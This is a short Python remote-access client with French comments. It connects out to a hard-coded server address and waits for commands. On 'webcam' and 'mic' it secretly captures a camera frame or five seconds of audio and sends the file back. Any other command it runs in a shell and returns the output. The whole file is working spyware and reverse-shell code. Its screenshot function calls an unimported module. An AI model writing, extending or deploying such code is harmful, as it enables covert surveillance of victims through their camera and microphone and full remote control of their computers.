import socket
import subprocess
import cv2
import sounddevice as sd
from scipy.io.wavfile import write

def capture_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screen.png")

def capture_webcam():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    cam.release()
    if ret:
        cv2.imwrite("webcam.jpg", frame)
        return True
    return False

def record_audio(filename="audio.wav", duration=5, samplerate=44100):
    audio = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=2)
    sd.wait()
    write(filename, samplerate, audio)

host = '192.168.0.131'  # ⬅️ Remplace ici par l'IP réelle de la machine serveur
port = 9999

client = socket.socket()
client.connect((host, port))

while True:
    cmd = client.recv(1024).decode()
    if cmd.lower() in ['exit', 'quit']:
        break

    elif cmd.lower() == "webcam":
        if capture_webcam():
            with open("webcam.jpg", "rb") as f:
                data = f.read()
                client.send(str(len(data)).encode())
                ack = client.recv(1024)
                client.sendall(data)
        else:
            client.send(b"0")  # échec webcam

    elif cmd.lower() == "mic":
        record_audio()
        with open("audio.wav", "rb") as f:
            data = f.read()
            client.send(str(len(data)).encode())
            ack = client.recv(1024)
            client.sendall(data)

    else:
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output
        client.send(output)

client.close()

